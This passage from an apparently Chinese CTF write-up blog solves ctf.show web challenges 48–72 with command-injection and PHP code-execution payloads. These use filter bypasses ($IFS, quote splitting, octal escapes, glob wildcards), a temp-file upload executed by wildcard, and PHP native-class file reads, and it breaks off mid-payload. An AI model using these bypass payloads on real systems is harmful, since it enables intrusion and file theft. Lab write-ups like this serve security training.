class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h3 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><h3 id="0x01-6"><a href="#0x01-6" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h3 id="0x02-6"><a href="#0x02-6" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><h3 id="0x01-7"><a href="#0x01-7" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">tac</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h3 id="0x02-7"><a href="#0x02-7" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span>&lt;fl<span class="hljs-string">&#x27;&#x27;</span>ag.php||<br></code></pre></td></tr></table></figure><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">ls</span><span class="hljs-variable">$IFS</span>/||<br>?c=<span class="hljs-built_in">nl</span><span class="hljs-variable">$IFS</span>/fla?||<br></code></pre></td></tr></table></figure><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=ca<span class="hljs-string">&#x27;&#x27;</span>t<span class="hljs-variable">$&#123;IFS&#125;</span>fla?.php<br></code></pre></td></tr></table></figure><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><h3 id="0x01-8"><a href="#0x01-8" class="headerlink" title="0x01"></a>0x01</h3><p>复制粘贴型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">mv</span><span class="hljs-variable">$&#123;IFS&#125;</span>fla?.php<span class="hljs-variable">$&#123;IFS&#125;</span>a.txt<br></code></pre></td></tr></table></figure><h3 id="0x02-8"><a href="#0x02-8" class="headerlink" title="0x02"></a>0x02</h3><p>全局查找，<code>-r</code>递归文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=grep<span class="hljs-variable">$&#123;IFS&#125;</span>-r<span class="hljs-variable">$&#123;IFS&#125;</span><span class="hljs-string">&#x27;fla&#x27;</span><span class="hljs-variable">$&#123;IFS&#125;</span>.<br></code></pre></td></tr></table></figure><h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><h3 id="0x01-9"><a href="#0x01-9" class="headerlink" title="0x01"></a>0x01</h3><p>八进制转化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=$<span class="hljs-string">&#x27;\154\163&#x27;</span> <span class="hljs-comment"># ls</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=$<span class="hljs-string">&#x27;\164\141\143&#x27;</span> $<span class="hljs-string">&#x27;\146\154\141\147\56\160\150\160&#x27;</span> <span class="hljs-comment"># tac flag.php</span><br></code></pre></td></tr></table></figure><h3 id="0x02-9"><a href="#0x02-9" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。<br><br>但因为字母不能传入，我们需要使用通配符?来进行代替<br><br>?c=/bin/base64 flag.php<br><br>替换后变成<br><br>?c=/???/????64 ????.???<br></code></pre></td></tr></table></figure><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这题由于基本都禁了，需要用到文件上传到临时文件，利用glob通配符进行<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">无字母数字webshell之提高篇</a>，已知A-Z在ASCII里面是被@和[包括的，那么可以使用<code>[@-[]</code>来表示，虽然是随机的，那么可以用<code>?c=.%20/???/????????[@-[] </code>进行匹配文件，这里需要上传一个文件，利用简单的html进行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://e76b0b60-1e1a-4cc2-b39e-e3548d1a6fcc.challenge.ctf.show/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>利用一个简单的文本</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#!/bin/sh<br>cat flag.php<br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><p>利用linux语言的特性构造36</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br></code></pre></td></tr></table></figure><h2 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h2><h3 id="0x01-10"><a href="#0x01-10" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readfile(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02-10"><a href="#0x02-10" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=copy(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">&quot;flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=print_r(file(<span class="hljs-string">&quot;flag.php&quot;</span>));     <br></code></pre></td></tr></table></figure><h2 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h2><p>基本同上可以找到</p><h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><p>检测一下直接上，题目一样的，过滤了几个函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=copy(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;flag.txt&quot;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><h3 id="0x01-11"><a href="#0x01-11" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>))<br>c=highlight_file(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02-11"><a href="#0x02-11" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;;<br><br><br>c=%<span class="hljs-number">24</span>dir%<span class="hljs-number">3</span>Dnew%<span class="hljs-number">20</span><span class="hljs-built_in">DirectoryIterator</span>(%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aforeach(%<span class="hljs-number">24</span>dir%<span class="hljs-number">20</span><span class="hljs-keyword">as</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>f)%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span><span class="hljs-keyword">echo</span>(%<span class="hljs-number">24</span>f.<span class="hljs-string">&#x27;%3Cbr%3E&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$exp</span>;<br><br><br>c=%<span class="hljs-number">24</span>exp%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">20</span><span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;%2Fflag.txt&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aecho%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>exp%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure><p>一个奇巧的思路，利用php的原生类进行的读取都需要进行url编码</p><h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><h3 id="0x01-12"><a href="#0x01-12" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;;<br><br><br>c=%<span class="hljs-number">24</span>dir%<span class="hljs-number">3</span>Dnew%<span class="hljs-number">20</span><span class="hljs-built_in">DirectoryIterator</span>(%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aforeach(%<span class="hljs-number">24</span>dir%<span class="hljs-number">20</span><span class="hljs-keyword">as</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>f)%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span><span class="hljs-keyword">echo</span>(%<span class="hljs-number">24</span>f.<span class="hljs-string">&#x27;%3Cbr%3E&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$exp</span>;<br><br><br>c=%<span class="hljs-number">24</span>exp%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">20</span><span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;%2Fflag.txt&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aecho%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>exp%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure><h3 id="0x02-12"><a href="#0x02-12" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>))<br>c=highlight_file(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p>😋发现我这种解法好像官p还没有也是直接上原生</p><p>先进行<code>c=var_dump(scandir(&#39;/&#39;));</code>或者用上面的原生类</p><h3 id="0x01-13"><a href="#0x01-13" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=%24exp%20%3D%20new%20SplFileObject(<span class="hljs-string">&#x27;%2Fflag.txt&#x27;</span>)%3B%0Aecho%20%24exp%3B;<br></code></pre></td></tr></table></figure><h3 id="0x02-13"><a href="#0x02-13" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>readgzfile函数在 PHP 中用于读取一个 GZIP 压缩的文件并直接输出其内容。</p><h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>新的思路扫描目录</p><p><code>c=echo%20implode(&quot;,&quot;,(scandir(&#39;/&#39;)));</code></p><p>这段代码利用了 <code>scandir(&#39;/&#39;)</code> 函数来列出根目录的内容，然后用 <code>implode(&quot;,&quot;, ...)</code> 将数组连接为一个字符串，再通过 <code>echo</code> 输出。</p><h3 id="0x01-14"><a href="#0x01-14" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02-14"><a href="#0x02-14" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>readgzfile函数在 PHP 中用于读取一个 GZIP 压缩的文件并直接输出其内容。</p><p>原生类用不来了，可能过长了</p><h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p>同69基本没变化</p><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><p>看一下源码关键内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>      <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>      <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br></code></pre></td></tr></table></figure><p>简单的来说就是缓冲区清理，防止直接暴露信息</p><h3 id="0x01-15"><a href="#0x01-15" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-built_in">exit</span>();<br></code></pre></td></tr></table></figure><p>exit进行截断</p><h3 id="0x02-15"><a href="#0x02-15" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<span class="hljs-built_in">exit</span>();<br></code></pre></td></tr></table></figure><p>当然也可以进行提前送出</p><h3 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);ob_flush();<br></code></pre></td></tr></table></figure><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>看源码也没什么思路，去看了下官p，思路还是要发散一下，这里也是利用了原生类进行读取找到flag所在的文件在哪里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span 